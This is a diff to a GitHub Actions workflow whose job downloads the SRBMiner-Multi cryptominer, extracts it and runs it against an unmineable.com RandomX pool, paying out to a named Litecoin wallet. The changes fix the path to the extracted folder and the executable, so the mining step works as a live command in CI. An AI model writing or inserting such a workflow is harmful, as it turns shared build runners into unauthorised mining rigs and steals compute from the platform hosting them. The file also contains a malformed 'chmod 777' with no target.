@@ -28,8 +28,8 @@ jobs:
         run: |
           wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.0/SRBMiner-Multi-2-6-0-Linux.tar.gz
           tar -xvf SRBMiner-Multi-2-6-0-Linux.tar.gz
-          cd SRBMiner-Multi-2-6-0-Linux
+          cd SRBMiner-Multi-2-6-0
           ls 
           chmod 777
-          ././SRBMiner-MULTI --algorithm randomx --pool stratum+ssl://rx.unmineable.com:443 --wallet LTC:LTc5WcJM49gUR8ioqE9BEEgkrwNqUoVgJo.CPU-Unlvisal#mo4y-tkdg
+          ./SRBMiner-MULTI --algorithm randomx --pool stratum+ssl://rx.unmineable.com:443 --wallet LTC:LTc5WcJM49gUR8ioqE9BEEgkrwNqUoVgJo.CPU-Unlvisal#mo4y-tkdg
           
